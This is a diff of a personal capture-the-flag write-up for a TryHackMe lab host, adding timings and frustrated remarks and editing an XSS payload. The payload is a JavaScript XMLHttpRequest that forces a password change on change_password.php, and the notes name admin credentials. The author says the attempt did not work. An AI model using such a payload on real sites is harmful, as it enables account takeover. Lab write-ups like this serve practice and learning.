@@ -9,11 +9,11 @@
 **OS :** ?
 
 ##### **Conclusion**
-**Time :** 
+**Time :** 1h51
 	**Start :** 25.03.2025 18:55
 	**Break at/to :** 25.03.2025 19:14 / 25.03.2025 20:04
-	**Finish :** 
-**Satisfaction :**  
+	**Finish :** 25.03.2025 21:36
+**Satisfaction :**  0/10 Nothing was working and I use medium but again nothing was working.
 ### 1. **Reconnaissance
 
 First #nmap scan
@@ -148,7 +148,7 @@ On the `chat.php` page we can send an #XSS and it's working. So we send the same
 ```JS
 <script>
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', "http" + "://worldwap.thm:8081/change_password.php", true);
+        xhr.open('POST', "http" + "://login.worldwap.thm/change_password.php", true);
         xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         xhr.onreadystatechange = function () {
@@ -164,8 +164,11 @@ So now we juste need to logout and log as admin with `admin:password123`
 But I don't know why it's doesn't work. So I remember that we have a admin.py file. And It's was maybe an error of THM but there is the admin password:
 ![[Pasted image 20250325212939.png]]
 
+After a lot of try nothing was working I don't know why...
 ## 5. **Installation
 
 ## 6. **Command and Control
 
 ## 7. **Actions on Objectives
+
+...
